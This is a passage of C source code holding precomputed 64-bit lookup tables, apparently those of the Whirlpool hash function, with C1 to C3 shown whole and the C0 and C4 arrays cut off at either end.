    LL(0xb3b3f6b3f1457b42), LL(0x2121842115a54234), LL(0x9c9c4a9c94d62508), LL(0x1e1e781ef0663cee),
    LL(0x4343114322528661), LL(0xc7c73bc776fc93b1), LL(0xfcfcd7fcb32be54f), LL(0x0404100420140824),
    LL(0x51515951b208a2e3), LL(0x99995e99bcc72f25), LL(0x6d6da96d4fc4da22), LL(0x0d0d340d68391a65),
    LL(0xfafacffa8335e979), LL(0xdfdf5bdfb684a369), LL(0x7e7ee57ed79bfca9), LL(0x242490243db44819),
    LL(0x3b3bec3bc5d776fe), LL(0xabab96ab313d4b9a), LL(0xcece1fce3ed181f0), LL(0x1111441188552299),
    LL(0x8f8f068f0c890383), LL(0x4e4e254e4a6b9c04), LL(0xb7b7e6b7d1517366), LL(0xebeb8beb0b60cbe0),
    LL(0x3c3cf03cfdcc78c1), LL(0x81813e817cbf1ffd), LL(0x94946a94d4fe3540), LL(0xf7f7fbf7eb0cf31c),
    LL(0xb9b9deb9a1676f18), LL(0x13134c13985f268b), LL(0x2c2cb02c7d9c5851), LL(0xd3d36bd3d6b8bb05),
    LL(0xe7e7bbe76b5cd38c), LL(0x6e6ea56e57cbdc39), LL(0xc4c437c46ef395aa), LL(0x03030c03180f061b),
    LL(0x565645568a13acdc), LL(0x44440d441a49885e), LL(0x7f7fe17fdf9efea0), LL(0xa9a99ea921374f88),
    LL(0x2a2aa82a4d825467), LL(0xbbbbd6bbb16d6b0a), LL(0xc1c123c146e29f87), LL(0x53535153a202a6f1),
    LL(0xdcdc57dcae8ba572), LL(0x0b0b2c0b58271653), LL(0x9d9d4e9d9cd32701), LL(0x6c6cad6c47c1d82b),
    LL(0x3131c43195f562a4), LL(0x7474cd7487b9e8f3), LL(0xf6f6fff6e309f115), LL(0x464605460a438c4c),
    LL(0xacac8aac092645a5), LL(0x89891e893c970fb5), LL(0x14145014a04428b4), LL(0xe1e1a3e15b42dfba),
    LL(0x16165816b04e2ca6), LL(0x3a3ae83acdd274f7), LL(0x6969b9696fd0d206), LL(0x09092409482d1241),
    LL(0x7070dd70a7ade0d7), LL(0xb6b6e2b6d954716f), LL(0xd0d067d0ceb7bd1e), LL(0xeded93ed3b7ec7d6),
    LL(0xcccc17cc2edb85e2), LL(0x424215422a578468), LL(0x98985a98b4c22d2c), LL(0xa4a4aaa4490e55ed),
    LL(0x2828a0285d885075), LL(0x5c5c6d5cda31b886), LL(0xf8f8c7f8933fed6b), LL(0x8686228644a411c2),
};

static const u64 C1[256] = {
    LL(0xd818186018c07830), LL(0x2623238c2305af46), LL(0xb8c6c63fc67ef991), LL(0xfbe8e887e8136fcd),
    LL(0xcb878726874ca113), LL(0x11b8b8dab8a9626d), LL(0x0901010401080502), LL(0x0d4f4f214f426e9e),
    LL(0x9b3636d836adee6c), LL(0xffa6a6a2a6590451), LL(0x0cd2d26fd2debdb9), LL(0x0ef5f5f3f5fb06f7),
    LL(0x967979f979ef80f2), LL(0x306f6fa16f5fcede), LL(0x6d91917e91fcef3f), LL(0xf852525552aa07a4),
    LL(0x4760609d6027fdc0), LL(0x35bcbccabc897665), LL(0x379b9b569baccd2b), LL(0x8a8e8e028e048c01),
    LL(0xd2a3a3b6a371155b), LL(0x6c0c0c300c603c18), LL(0x847b7bf17bff8af6), LL(0x803535d435b5e16a),
    LL(0xf51d1d741de8693a), LL(0xb3e0e0a7e05347dd), LL(0x21d7d77bd7f6acb3), LL(0x9cc2c22fc25eed99),
    LL(0x432e2eb82e6d965c), LL(0x294b4b314b627a96), LL(0x5dfefedffea321e1), LL(0xd5575741578216ae),
    LL(0xbd15155415a8412a), LL(0xe87777c1779fb6ee), LL(0x923737dc37a5eb6e), LL(0x9ee5e5b3e57b56d7),
    LL(0x139f9f469f8cd923), LL(0x23f0f0e7f0d317fd), LL(0x204a4a354a6a7f94), LL(0x44dada4fda9e95a9),
    LL(0xa258587d58fa25b0), LL(0xcfc9c903c906ca8f), LL(0x7c2929a429558d52), LL(0x5a0a0a280a502214),
    LL(0x50b1b1feb1e14f7f), LL(0xc9a0a0baa0691a5d), LL(0x146b6bb16b7fdad6), LL(0xd985852e855cab17),
    LL(0x3cbdbdcebd817367), LL(0x8f5d5d695dd234ba), LL(0x9010104010805020), LL(0x07f4f4f7f4f303f5),
    LL(0xddcbcb0bcb16c08b), LL(0xd33e3ef83eedc67c), LL(0x2d0505140528110a), LL(0x78676781671fe6ce),
    LL(0x97e4e4b7e47353d5), LL(0x0227279c2725bb4e), LL(0x7341411941325882), LL(0xa78b8b168b2c9d0b),
    LL(0xf6a7a7a6a7510153), LL(0xb27d7de97dcf94fa), LL(0x4995956e95dcfb37), LL(0x56d8d847d88e9fad),
    LL(0x70fbfbcbfb8b30eb), LL(0xcdeeee9fee2371c1), LL(0xbb7c7ced7cc791f8), LL(0x716666856617e3cc),
    LL(0x7bdddd53dda68ea7), LL(0xaf17175c17b84b2e), LL(0x454747014702468e), LL(0x1a9e9e429e84dc21),
    LL(0xd4caca0fca1ec589), LL(0x582d2db42d75995a), LL(0x2ebfbfc6bf917963), LL(0x3f07071c07381b0e),
    LL(0xacadad8ead012347), LL(0xb05a5a755aea2fb4), LL(0xef838336836cb51b), LL(0xb63333cc3385ff66),
    LL(0x5c636391633ff2c6), LL(0x1202020802100a04), LL(0x93aaaa92aa393849), LL(0xde7171d971afa8e2),
    LL(0xc6c8c807c80ecf8d), LL(0xd119196419c87d32), LL(0x3b49493949727092), LL(0x5fd9d943d9869aaf),
    LL(0x31f2f2eff2c31df9), LL(0xa8e3e3abe34b48db), LL(0xb95b5b715be22ab6), LL(0xbc88881a8834920d),
    LL(0x3e9a9a529aa4c829), LL(0x0b262698262dbe4c), LL(0xbf3232c8328dfa64), LL(0x59b0b0fab0e94a7d),
    LL(0xf2e9e983e91b6acf), LL(0x770f0f3c0f78331e), LL(0x33d5d573d5e6a6b7), LL(0xf480803a8074ba1d),
    LL(0x27bebec2be997c61), LL(0xebcdcd13cd26de87), LL(0x893434d034bde468), LL(0x3248483d487a7590),
    LL(0x54ffffdbffab24e3), LL(0x8d7a7af57af78ff4), LL(0x6490907a90f4ea3d), LL(0x9d5f5f615fc23ebe),
    LL(0x3d202080201da040), LL(0x0f6868bd6867d5d0), LL(0xca1a1a681ad07234), LL(0xb7aeae82ae192c41),
    LL(0x7db4b4eab4c95e75), LL(0xce54544d549a19a8), LL(0x7f93937693ece53b), LL(0x2f222288220daa44),
    LL(0x6364648d6407e9c8), LL(0x2af1f1e3f1db12ff), LL(0xcc7373d173bfa2e6), LL(0x8212124812905a24),
    LL(0x7a40401d403a5d80), LL(0x4808082008402810), LL(0x95c3c32bc356e89b), LL(0xdfecec97ec337bc5),
    LL(0x4ddbdb4bdb9690ab), LL(0xc0a1a1bea1611f5f), LL(0x918d8d0e8d1c8307), LL(0xc83d3df43df5c97a),
    LL(0x5b97976697ccf133), LL(0x0000000000000000), LL(0xf9cfcf1bcf36d483), LL(0x6e2b2bac2b458756),
    LL(0xe17676c57697b3ec), LL(0xe68282328264b019), LL(0x28d6d67fd6fea9b1), LL(0xc31b1b6c1bd87736),
    LL(0x74b5b5eeb5c15b77), LL(0xbeafaf86af112943), LL(0x1d6a6ab56a77dfd4), LL(0xea50505d50ba0da0),
    LL(0x5745450945124c8a), LL(0x38f3f3ebf3cb18fb), LL(0xad3030c0309df060), LL(0xc4efef9bef2b74c3),
    LL(0xda3f3ffc3fe5c37e), LL(0xc755554955921caa), LL(0xdba2a2b2a2791059), LL(0xe9eaea8fea0365c9),
    LL(0x6a656589650fecca), LL(0x03babad2bab96869), LL(0x4a2f2fbc2f65935e), LL(0x8ec0c027c04ee79d),
    LL(0x60dede5fdebe81a1), LL(0xfc1c1c701ce06c38), LL(0x46fdfdd3fdbb2ee7), LL(0x1f4d4d294d52649a),
    LL(0x7692927292e4e039), LL(0xfa7575c9758fbcea), LL(0x3606061806301e0c), LL(0xae8a8a128a249809),
    LL(0x4bb2b2f2b2f94079), LL(0x85e6e6bfe66359d1), LL(0x7e0e0e380e70361c), LL(0xe71f1f7c1ff8633e),
    LL(0x556262956237f7c4), LL(0x3ad4d477d4eea3b5), LL(0x81a8a89aa829324d), LL(0x5296966296c4f431),
    LL(0x62f9f9c3f99b3aef), LL(0xa3c5c533c566f697), LL(0x102525942535b14a), LL(0xab59597959f220b2),
    LL(0xd084842a8454ae15), LL(0xc57272d572b7a7e4), LL(0xec3939e439d5dd72), LL(0x164c4c2d4c5a6198),
    LL(0x945e5e655eca3bbc), LL(0x9f7878fd78e785f0), LL(0xe53838e038ddd870), LL(0x988c8c0a8c148605),
    LL(0x17d1d163d1c6b2bf), LL(0xe4a5a5aea5410b57), LL(0xa1e2e2afe2434dd9), LL(0x4e616199612ff8c2),
    LL(0x42b3b3f6b3f1457b), LL(0x342121842115a542), LL(0x089c9c4a9c94d625), LL(0xee1e1e781ef0663c),
    LL(0x6143431143225286), LL(0xb1c7c73bc776fc93), LL(0x4ffcfcd7fcb32be5), LL(0x2404041004201408),
    LL(0xe351515951b208a2), LL(0x2599995e99bcc72f), LL(0x226d6da96d4fc4da), LL(0x650d0d340d68391a),
    LL(0x79fafacffa8335e9), LL(0x69dfdf5bdfb684a3), LL(0xa97e7ee57ed79bfc), LL(0x19242490243db448),
    LL(0xfe3b3bec3bc5d776), LL(0x9aabab96ab313d4b), LL(0xf0cece1fce3ed181), LL(0x9911114411885522),
    LL(0x838f8f068f0c8903), LL(0x044e4e254e4a6b9c), LL(0x66b7b7e6b7d15173), LL(0xe0ebeb8beb0b60cb),
    LL(0xc13c3cf03cfdcc78), LL(0xfd81813e817cbf1f), LL(0x4094946a94d4fe35), LL(0x1cf7f7fbf7eb0cf3),
    LL(0x18b9b9deb9a1676f), LL(0x8b13134c13985f26), LL(0x512c2cb02c7d9c58), LL(0x05d3d36bd3d6b8bb),
    LL(0x8ce7e7bbe76b5cd3), LL(0x396e6ea56e57cbdc), LL(0xaac4c437c46ef395), LL(0x1b03030c03180f06),
    LL(0xdc565645568a13ac), LL(0x5e44440d441a4988), LL(0xa07f7fe17fdf9efe), LL(0x88a9a99ea921374f),
    LL(0x672a2aa82a4d8254), LL(0x0abbbbd6bbb16d6b), LL(0x87c1c123c146e29f), LL(0xf153535153a202a6),
    LL(0x72dcdc57dcae8ba5), LL(0x530b0b2c0b582716), LL(0x019d9d4e9d9cd327), LL(0x2b6c6cad6c47c1d8),
    LL(0xa43131c43195f562), LL(0xf37474cd7487b9e8), LL(0x15f6f6fff6e309f1), LL(0x4c464605460a438c),
    LL(0xa5acac8aac092645), LL(0xb589891e893c970f), LL(0xb414145014a04428), LL(0xbae1e1a3e15b42df),
    LL(0xa616165816b04e2c), LL(0xf73a3ae83acdd274), LL(0x066969b9696fd0d2), LL(0x4109092409482d12),
    LL(0xd77070dd70a7ade0), LL(0x6fb6b6e2b6d95471), LL(0x1ed0d067d0ceb7bd), LL(0xd6eded93ed3b7ec7),
    LL(0xe2cccc17cc2edb85), LL(0x68424215422a5784), LL(0x2c98985a98b4c22d), LL(0xeda4a4aaa4490e55),
    LL(0x752828a0285d8850), LL(0x865c5c6d5cda31b8), LL(0x6bf8f8c7f8933fed), LL(0xc28686228644a411),
};

static const u64 C2[256] = {
    LL(0x30d818186018c078), LL(0x462623238c2305af), LL(0x91b8c6c63fc67ef9), LL(0xcdfbe8e887e8136f),
    LL(0x13cb878726874ca1), LL(0x6d11b8b8dab8a962), LL(0x0209010104010805), LL(0x9e0d4f4f214f426e),
    LL(0x6c9b3636d836adee), LL(0x51ffa6a6a2a65904), LL(0xb90cd2d26fd2debd), LL(0xf70ef5f5f3f5fb06),
    LL(0xf2967979f979ef80), LL(0xde306f6fa16f5fce), LL(0x3f6d91917e91fcef), LL(0xa4f852525552aa07),
    LL(0xc04760609d6027fd), LL(0x6535bcbccabc8976), LL(0x2b379b9b569baccd), LL(0x018a8e8e028e048c),
    LL(0x5bd2a3a3b6a37115), LL(0x186c0c0c300c603c), LL(0xf6847b7bf17bff8a), LL(0x6a803535d435b5e1),
    LL(0x3af51d1d741de869), LL(0xddb3e0e0a7e05347), LL(0xb321d7d77bd7f6ac), LL(0x999cc2c22fc25eed),
    LL(0x5c432e2eb82e6d96), LL(0x96294b4b314b627a), LL(0xe15dfefedffea321), LL(0xaed5575741578216),
    LL(0x2abd15155415a841), LL(0xeee87777c1779fb6), LL(0x6e923737dc37a5eb), LL(0xd79ee5e5b3e57b56),
    LL(0x23139f9f469f8cd9), LL(0xfd23f0f0e7f0d317), LL(0x94204a4a354a6a7f), LL(0xa944dada4fda9e95),
    LL(0xb0a258587d58fa25), LL(0x8fcfc9c903c906ca), LL(0x527c2929a429558d), LL(0x145a0a0a280a5022),
    LL(0x7f50b1b1feb1e14f), LL(0x5dc9a0a0baa0691a), LL(0xd6146b6bb16b7fda), LL(0x17d985852e855cab),
    LL(0x673cbdbdcebd8173), LL(0xba8f5d5d695dd234), LL(0x2090101040108050), LL(0xf507f4f4f7f4f303),
    LL(0x8bddcbcb0bcb16c0), LL(0x7cd33e3ef83eedc6), LL(0x0a2d050514052811), LL(0xce78676781671fe6),
    LL(0xd597e4e4b7e47353), LL(0x4e0227279c2725bb), LL(0x8273414119413258), LL(0x0ba78b8b168b2c9d),
    LL(0x53f6a7a7a6a75101), LL(0xfab27d7de97dcf94), LL(0x374995956e95dcfb), LL(0xad56d8d847d88e9f),
    LL(0xeb70fbfbcbfb8b30), LL(0xc1cdeeee9fee2371), LL(0xf8bb7c7ced7cc791), LL(0xcc716666856617e3),
    LL(0xa77bdddd53dda68e), LL(0x2eaf17175c17b84b), LL(0x8e45474701470246), LL(0x211a9e9e429e84dc),
    LL(0x89d4caca0fca1ec5), LL(0x5a582d2db42d7599), LL(0x632ebfbfc6bf9179), LL(0x0e3f07071c07381b),
    LL(0x47acadad8ead0123), LL(0xb4b05a5a755aea2f), LL(0x1bef838336836cb5), LL(0x66b63333cc3385ff),
    LL(0xc65c636391633ff2), LL(0x041202020802100a), LL(0x4993aaaa92aa3938), LL(0xe2de7171d971afa8),
    LL(0x8dc6c8c807c80ecf), LL(0x32d119196419c87d), LL(0x923b494939497270), LL(0xaf5fd9d943d9869a),
    LL(0xf931f2f2eff2c31d), LL(0xdba8e3e3abe34b48), LL(0xb6b95b5b715be22a), LL(0x0dbc88881a883492),
    LL(0x293e9a9a529aa4c8), LL(0x4c0b262698262dbe), LL(0x64bf3232c8328dfa), LL(0x7d59b0b0fab0e94a),
    LL(0xcff2e9e983e91b6a), LL(0x1e770f0f3c0f7833), LL(0xb733d5d573d5e6a6), LL(0x1df480803a8074ba),
    LL(0x6127bebec2be997c), LL(0x87ebcdcd13cd26de), LL(0x68893434d034bde4), LL(0x903248483d487a75),
    LL(0xe354ffffdbffab24), LL(0xf48d7a7af57af78f), LL(0x3d6490907a90f4ea), LL(0xbe9d5f5f615fc23e),
    LL(0x403d202080201da0), LL(0xd00f6868bd6867d5), LL(0x34ca1a1a681ad072), LL(0x41b7aeae82ae192c),
    LL(0x757db4b4eab4c95e), LL(0xa8ce54544d549a19), LL(0x3b7f93937693ece5), LL(0x442f222288220daa),
    LL(0xc86364648d6407e9), LL(0xff2af1f1e3f1db12), LL(0xe6cc7373d173bfa2), LL(0x248212124812905a),
    LL(0x807a40401d403a5d), LL(0x1048080820084028), LL(0x9b95c3c32bc356e8), LL(0xc5dfecec97ec337b),
    LL(0xab4ddbdb4bdb9690), LL(0x5fc0a1a1bea1611f), LL(0x07918d8d0e8d1c83), LL(0x7ac83d3df43df5c9),
    LL(0x335b97976697ccf1), LL(0x0000000000000000), LL(0x83f9cfcf1bcf36d4), LL(0x566e2b2bac2b4587),
    LL(0xece17676c57697b3), LL(0x19e68282328264b0), LL(0xb128d6d67fd6fea9), LL(0x36c31b1b6c1bd877),
    LL(0x7774b5b5eeb5c15b), LL(0x43beafaf86af1129), LL(0xd41d6a6ab56a77df), LL(0xa0ea50505d50ba0d),
    LL(0x8a5745450945124c), LL(0xfb38f3f3ebf3cb18), LL(0x60ad3030c0309df0), LL(0xc3c4efef9bef2b74),
    LL(0x7eda3f3ffc3fe5c3), LL(0xaac755554955921c), LL(0x59dba2a2b2a27910), LL(0xc9e9eaea8fea0365),
    LL(0xca6a656589650fec), LL(0x6903babad2bab968), LL(0x5e4a2f2fbc2f6593), LL(0x9d8ec0c027c04ee7),
    LL(0xa160dede5fdebe81), LL(0x38fc1c1c701ce06c), LL(0xe746fdfdd3fdbb2e), LL(0x9a1f4d4d294d5264),
    LL(0x397692927292e4e0), LL(0xeafa7575c9758fbc), LL(0x0c3606061806301e), LL(0x09ae8a8a128a2498),
    LL(0x794bb2b2f2b2f940), LL(0xd185e6e6bfe66359), LL(0x1c7e0e0e380e7036), LL(0x3ee71f1f7c1ff863),
    LL(0xc4556262956237f7), LL(0xb53ad4d477d4eea3), LL(0x4d81a8a89aa82932), LL(0x315296966296c4f4),
    LL(0xef62f9f9c3f99b3a), LL(0x97a3c5c533c566f6), LL(0x4a102525942535b1), LL(0xb2ab59597959f220),
    LL(0x15d084842a8454ae), LL(0xe4c57272d572b7a7), LL(0x72ec3939e439d5dd), LL(0x98164c4c2d4c5a61),
    LL(0xbc945e5e655eca3b), LL(0xf09f7878fd78e785), LL(0x70e53838e038ddd8), LL(0x05988c8c0a8c1486),
    LL(0xbf17d1d163d1c6b2), LL(0x57e4a5a5aea5410b), LL(0xd9a1e2e2afe2434d), LL(0xc24e616199612ff8),
    LL(0x7b42b3b3f6b3f145), LL(0x42342121842115a5), LL(0x25089c9c4a9c94d6), LL(0x3cee1e1e781ef066),
    LL(0x8661434311432252), LL(0x93b1c7c73bc776fc), LL(0xe54ffcfcd7fcb32b), LL(0x0824040410042014),
    LL(0xa2e351515951b208), LL(0x2f2599995e99bcc7), LL(0xda226d6da96d4fc4), LL(0x1a650d0d340d6839),
    LL(0xe979fafacffa8335), LL(0xa369dfdf5bdfb684), LL(0xfca97e7ee57ed79b), LL(0x4819242490243db4),
    LL(0x76fe3b3bec3bc5d7), LL(0x4b9aabab96ab313d), LL(0x81f0cece1fce3ed1), LL(0x2299111144118855),
    LL(0x03838f8f068f0c89), LL(0x9c044e4e254e4a6b), LL(0x7366b7b7e6b7d151), LL(0xcbe0ebeb8beb0b60),
    LL(0x78c13c3cf03cfdcc), LL(0x1ffd81813e817cbf), LL(0x354094946a94d4fe), LL(0xf31cf7f7fbf7eb0c),
    LL(0x6f18b9b9deb9a167), LL(0x268b13134c13985f), LL(0x58512c2cb02c7d9c), LL(0xbb05d3d36bd3d6b8),
    LL(0xd38ce7e7bbe76b5c), LL(0xdc396e6ea56e57cb), LL(0x95aac4c437c46ef3), LL(0x061b03030c03180f),
    LL(0xacdc565645568a13), LL(0x885e44440d441a49), LL(0xfea07f7fe17fdf9e), LL(0x4f88a9a99ea92137),
    LL(0x54672a2aa82a4d82), LL(0x6b0abbbbd6bbb16d), LL(0x9f87c1c123c146e2), LL(0xa6f153535153a202),
    LL(0xa572dcdc57dcae8b), LL(0x16530b0b2c0b5827), LL(0x27019d9d4e9d9cd3), LL(0xd82b6c6cad6c47c1),
    LL(0x62a43131c43195f5), LL(0xe8f37474cd7487b9), LL(0xf115f6f6fff6e309), LL(0x8c4c464605460a43),
    LL(0x45a5acac8aac0926), LL(0x0fb589891e893c97), LL(0x28b414145014a044), LL(0xdfbae1e1a3e15b42),
    LL(0x2ca616165816b04e), LL(0x74f73a3ae83acdd2), LL(0xd2066969b9696fd0), LL(0x124109092409482d),
    LL(0xe0d77070dd70a7ad), LL(0x716fb6b6e2b6d954), LL(0xbd1ed0d067d0ceb7), LL(0xc7d6eded93ed3b7e),
    LL(0x85e2cccc17cc2edb), LL(0x8468424215422a57), LL(0x2d2c98985a98b4c2), LL(0x55eda4a4aaa4490e),
    LL(0x50752828a0285d88), LL(0xb8865c5c6d5cda31), LL(0xed6bf8f8c7f8933f), LL(0x11c28686228644a4),
};

static const u64 C3[256] = {
    LL(0x7830d818186018c0), LL(0xaf462623238c2305), LL(0xf991b8c6c63fc67e), LL(0x6fcdfbe8e887e813),
    LL(0xa113cb878726874c), LL(0x626d11b8b8dab8a9), LL(0x0502090101040108), LL(0x6e9e0d4f4f214f42),
    LL(0xee6c9b3636d836ad), LL(0x0451ffa6a6a2a659), LL(0xbdb90cd2d26fd2de), LL(0x06f70ef5f5f3f5fb),
    LL(0x80f2967979f979ef), LL(0xcede306f6fa16f5f), LL(0xef3f6d91917e91fc), LL(0x07a4f852525552aa),
    LL(0xfdc04760609d6027), LL(0x766535bcbccabc89), LL(0xcd2b379b9b569bac), LL(0x8c018a8e8e028e04),
    LL(0x155bd2a3a3b6a371), LL(0x3c186c0c0c300c60), LL(0x8af6847b7bf17bff), LL(0xe16a803535d435b5),
    LL(0x693af51d1d741de8), LL(0x47ddb3e0e0a7e053), LL(0xacb321d7d77bd7f6), LL(0xed999cc2c22fc25e),
    LL(0x965c432e2eb82e6d), LL(0x7a96294b4b314b62), LL(0x21e15dfefedffea3), LL(0x16aed55757415782),
    LL(0x412abd15155415a8), LL(0xb6eee87777c1779f), LL(0xeb6e923737dc37a5), LL(0x56d79ee5e5b3e57b),
    LL(0xd923139f9f469f8c), LL(0x17fd23f0f0e7f0d3), LL(0x7f94204a4a354a6a), LL(0x95a944dada4fda9e),
    LL(0x25b0a258587d58fa), LL(0xca8fcfc9c903c906), LL(0x8d527c2929a42955), LL(0x22145a0a0a280a50),
    LL(0x4f7f50b1b1feb1e1), LL(0x1a5dc9a0a0baa069), LL(0xdad6146b6bb16b7f), LL(0xab17d985852e855c),
    LL(0x73673cbdbdcebd81), LL(0x34ba8f5d5d695dd2), LL(0x5020901010401080), LL(0x03f507f4f4f7f4f3),
    LL(0xc08bddcbcb0bcb16), LL(0xc67cd33e3ef83eed), LL(0x110a2d0505140528), LL(0xe6ce78676781671f),
    LL(0x53d597e4e4b7e473), LL(0xbb4e0227279c2725), LL(0x5882734141194132), LL(0x9d0ba78b8b168b2c),
    LL(0x0153f6a7a7a6a751), LL(0x94fab27d7de97dcf), LL(0xfb374995956e95dc), LL(0x9fad56d8d847d88e),
    LL(0x30eb70fbfbcbfb8b), LL(0x71c1cdeeee9fee23), LL(0x91f8bb7c7ced7cc7), LL(0xe3cc716666856617),
    LL(0x8ea77bdddd53dda6), LL(0x4b2eaf17175c17b8), LL(0x468e454747014702), LL(0xdc211a9e9e429e84),
    LL(0xc589d4caca0fca1e), LL(0x995a582d2db42d75), LL(0x79632ebfbfc6bf91), LL(0x1b0e3f07071c0738),
    LL(0x2347acadad8ead01), LL(0x2fb4b05a5a755aea), LL(0xb51bef838336836c), LL(0xff66b63333cc3385),
    LL(0xf2c65c636391633f), LL(0x0a04120202080210), LL(0x384993aaaa92aa39), LL(0xa8e2de7171d971af),
    LL(0xcf8dc6c8c807c80e), LL(0x7d32d119196419c8), LL(0x70923b4949394972), LL(0x9aaf5fd9d943d986),
    LL(0x1df931f2f2eff2c3), LL(0x48dba8e3e3abe34b), LL(0x2ab6b95b5b715be2), LL(0x920dbc88881a8834),
    LL(0xc8293e9a9a529aa4), LL(0xbe4c0b262698262d), LL(0xfa64bf3232c8328d), LL(0x4a7d59b0b0fab0e9),
    LL(0x6acff2e9e983e91b), LL(0x331e770f0f3c0f78), LL(0xa6b733d5d573d5e6), LL(0xba1df480803a8074),
    LL(0x7c6127bebec2be99), LL(0xde87ebcdcd13cd26), LL(0xe468893434d034bd), LL(0x75903248483d487a),
    LL(0x24e354ffffdbffab), LL(0x8ff48d7a7af57af7), LL(0xea3d6490907a90f4), LL(0x3ebe9d5f5f615fc2),
    LL(0xa0403d202080201d), LL(0xd5d00f6868bd6867), LL(0x7234ca1a1a681ad0), LL(0x2c41b7aeae82ae19),
    LL(0x5e757db4b4eab4c9), LL(0x19a8ce54544d549a), LL(0xe53b7f93937693ec), LL(0xaa442f222288220d),
    LL(0xe9c86364648d6407), LL(0x12ff2af1f1e3f1db), LL(0xa2e6cc7373d173bf), LL(0x5a24821212481290),
    LL(0x5d807a40401d403a), LL(0x2810480808200840), LL(0xe89b95c3c32bc356), LL(0x7bc5dfecec97ec33),
    LL(0x90ab4ddbdb4bdb96), LL(0x1f5fc0a1a1bea161), LL(0x8307918d8d0e8d1c), LL(0xc97ac83d3df43df5),
    LL(0xf1335b97976697cc), LL(0x0000000000000000), LL(0xd483f9cfcf1bcf36), LL(0x87566e2b2bac2b45),
    LL(0xb3ece17676c57697), LL(0xb019e68282328264), LL(0xa9b128d6d67fd6fe), LL(0x7736c31b1b6c1bd8),
    LL(0x5b7774b5b5eeb5c1), LL(0x2943beafaf86af11), LL(0xdfd41d6a6ab56a77), LL(0x0da0ea50505d50ba),
    LL(0x4c8a574545094512), LL(0x18fb38f3f3ebf3cb), LL(0xf060ad3030c0309d), LL(0x74c3c4efef9bef2b),
    LL(0xc37eda3f3ffc3fe5), LL(0x1caac75555495592), LL(0x1059dba2a2b2a279), LL(0x65c9e9eaea8fea03),
    LL(0xecca6a656589650f), LL(0x686903babad2bab9), LL(0x935e4a2f2fbc2f65), LL(0xe79d8ec0c027c04e),
    LL(0x81a160dede5fdebe), LL(0x6c38fc1c1c701ce0), LL(0x2ee746fdfdd3fdbb), LL(0x649a1f4d4d294d52),
    LL(0xe0397692927292e4), LL(0xbceafa7575c9758f), LL(0x1e0c360606180630), LL(0x9809ae8a8a128a24),
    LL(0x40794bb2b2f2b2f9), LL(0x59d185e6e6bfe663), LL(0x361c7e0e0e380e70), LL(0x633ee71f1f7c1ff8),
    LL(0xf7c4556262956237), LL(0xa3b53ad4d477d4ee), LL(0x324d81a8a89aa829), LL(0xf4315296966296c4),
    LL(0x3aef62f9f9c3f99b), LL(0xf697a3c5c533c566), LL(0xb14a102525942535), LL(0x20b2ab59597959f2),
    LL(0xae15d084842a8454), LL(0xa7e4c57272d572b7), LL(0xdd72ec3939e439d5), LL(0x6198164c4c2d4c5a),
    LL(0x3bbc945e5e655eca), LL(0x85f09f7878fd78e7), LL(0xd870e53838e038dd), LL(0x8605988c8c0a8c14),
    LL(0xb2bf17d1d163d1c6), LL(0x0b57e4a5a5aea541), LL(0x4dd9a1e2e2afe243), LL(0xf8c24e616199612f),
    LL(0x457b42b3b3f6b3f1), LL(0xa542342121842115), LL(0xd625089c9c4a9c94), LL(0x663cee1e1e781ef0),
    LL(0x5286614343114322), LL(0xfc93b1c7c73bc776), LL(0x2be54ffcfcd7fcb3), LL(0x1408240404100420),
    LL(0x08a2e351515951b2), LL(0xc72f2599995e99bc), LL(0xc4da226d6da96d4f), LL(0x391a650d0d340d68),
    LL(0x35e979fafacffa83), LL(0x84a369dfdf5bdfb6), LL(0x9bfca97e7ee57ed7), LL(0xb44819242490243d),
    LL(0xd776fe3b3bec3bc5), LL(0x3d4b9aabab96ab31), LL(0xd181f0cece1fce3e), LL(0x5522991111441188),
    LL(0x8903838f8f068f0c), LL(0x6b9c044e4e254e4a), LL(0x517366b7b7e6b7d1), LL(0x60cbe0ebeb8beb0b),
    LL(0xcc78c13c3cf03cfd), LL(0xbf1ffd81813e817c), LL(0xfe354094946a94d4), LL(0x0cf31cf7f7fbf7eb),
    LL(0x676f18b9b9deb9a1), LL(0x5f268b13134c1398), LL(0x9c58512c2cb02c7d), LL(0xb8bb05d3d36bd3d6),
    LL(0x5cd38ce7e7bbe76b), LL(0xcbdc396e6ea56e57), LL(0xf395aac4c437c46e), LL(0x0f061b03030c0318),
    LL(0x13acdc565645568a), LL(0x49885e44440d441a), LL(0x9efea07f7fe17fdf), LL(0x374f88a9a99ea921),
    LL(0x8254672a2aa82a4d), LL(0x6d6b0abbbbd6bbb1), LL(0xe29f87c1c123c146), LL(0x02a6f153535153a2),
    LL(0x8ba572dcdc57dcae), LL(0x2716530b0b2c0b58), LL(0xd327019d9d4e9d9c), LL(0xc1d82b6c6cad6c47),
    LL(0xf562a43131c43195), LL(0xb9e8f37474cd7487), LL(0x09f115f6f6fff6e3), LL(0x438c4c464605460a),
    LL(0x2645a5acac8aac09), LL(0x970fb589891e893c), LL(0x4428b414145014a0), LL(0x42dfbae1e1a3e15b),
    LL(0x4e2ca616165816b0), LL(0xd274f73a3ae83acd), LL(0xd0d2066969b9696f), LL(0x2d12410909240948),
    LL(0xade0d77070dd70a7), LL(0x54716fb6b6e2b6d9), LL(0xb7bd1ed0d067d0ce), LL(0x7ec7d6eded93ed3b),
    LL(0xdb85e2cccc17cc2e), LL(0x578468424215422a), LL(0xc22d2c98985a98b4), LL(0x0e55eda4a4aaa449),
    LL(0x8850752828a0285d), LL(0x31b8865c5c6d5cda), LL(0x3fed6bf8f8c7f893), LL(0xa411c28686228644),
};

static const u64 C4[256] = {
    LL(0xc07830d818186018), LL(0x05af462623238c23), LL(0x7ef991b8c6c63fc6), LL(0x136fcdfbe8e887e8),
    LL(0x4ca113cb87872687), LL(0xa9626d11b8b8dab8), LL(0x0805020901010401), LL(0x426e9e0d4f4f214f),
    LL(0xadee6c9b3636d836), LL(0x590451ffa6a6a2a6), LL(0xdebdb90cd2d26fd2), LL(0xfb06f70ef5f5f3f5),
    LL(0xef80f2967979f979), LL(0x5fcede306f6fa16f), LL(0xfcef3f6d91917e91), LL(0xaa07a4f852525552),
    LL(0x27fdc04760609d60), LL(0x89766535bcbccabc), LL(0xaccd2b379b9b569b), LL(0x048c018a8e8e028e),
    LL(0x71155bd2a3a3b6a3), LL(0x603c186c0c0c300c), LL(0xff8af6847b7bf17b), LL(0xb5e16a803535d435),
    LL(0xe8693af51d1d741d), LL(0x5347ddb3e0e0a7e0), LL(0xf6acb321d7d77bd7), LL(0x5eed999cc2c22fc2),
    LL(0x6d965c432e2eb82e), LL(0x627a96294b4b314b), LL(0xa321e15dfefedffe), LL(0x8216aed557574157),
